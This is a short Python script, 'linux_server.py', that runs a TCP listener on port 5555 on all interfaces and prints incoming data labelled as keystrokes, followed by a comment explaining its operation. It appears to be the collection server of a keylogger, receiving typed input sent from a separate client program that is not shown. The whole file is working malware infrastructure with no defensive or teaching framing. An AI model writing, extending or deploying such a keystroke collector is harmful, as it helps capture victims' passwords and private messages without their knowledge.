#linux_server.py
import socket

def start_server():
    host = '0.0.0.0'  # Listen on all interfaces
    port = 5555

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    print(f"[*] Listening on {host}:{port}")
    client_socket, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    try:
        while True:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(f"Keystrokes: {data}", end='', flush=True)
    except KeyboardInterrupt:
        print("\n[!] Server stopped")
    finally:
        client_socket.close()
        server.close()

if __name__ == "__main__":
    start_server()
# this code is a simple TCP server that listens for incoming connection on port 5555. when a client connects, it receives data (keystrokes) from the client and prints them to console. the server runs indefinitely until interrupted by a keyboard interrupt (Ctrl+c). it handles exceptions and ensures that the client socket and server socket are closed properly when the server stops.